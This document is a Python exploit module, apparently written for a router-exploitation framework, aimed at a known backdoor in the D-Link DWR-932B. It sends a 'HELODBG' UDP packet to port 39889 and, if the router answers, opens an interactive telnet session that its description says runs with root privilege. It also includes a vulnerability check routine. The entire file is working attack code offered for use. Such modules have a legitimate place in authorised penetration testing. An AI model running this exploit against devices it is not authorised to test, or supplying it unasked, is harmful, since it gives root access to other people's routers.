#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import socket
import telnetlib

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DWR-932B 39889 port backdoor',
        'description': 'D-Link DWR-932B backdoor allow telnet access with root pprivilege ',
        'reference': ['https://pierrekim.github.io/advisories/2016-dlink-0x00.txt'],
    }

    prompt = 'dwr_932b_backdoor'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)

        utils.print_info("Sending backdoor packet...")

        response = ""
        try:
            sock.sendto("HELODBG", (host, 39889))
            response = sock.recv(1024)
        except Exception as e:
            pass

        sock.close()

        if "Hello" in response:
            utils.print_success("Target seems to vulnerable")
            utils.print_info("Trying to connect to the telnet service {}:{}".format(host, 23))

            try:
                tn = telnetlib.Telnet(host, 23)
                tn.interact()
            except Exception as e:
                utils.print_failed("Exploit failed - could not connect to the telnet service")
        else:
            utils.print_failed("Exploit failed - target seems to be not vulnerable")

    def check(self, host, port, timeout):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)

        try:
            sock.sendto("HELODBG", (host, 39889))
            response = sock.recv(1024)

            if "Hello" in response:
                sock.sendto("BYEDBG", (host, 39889))
                return True  # target is vulnerable
        except Exception as e:
            pass

        return False  # target is not vulnerable

    def execute(self, host, port, timeout, cmd):
        return super().execute(host, port, timeout, cmd)
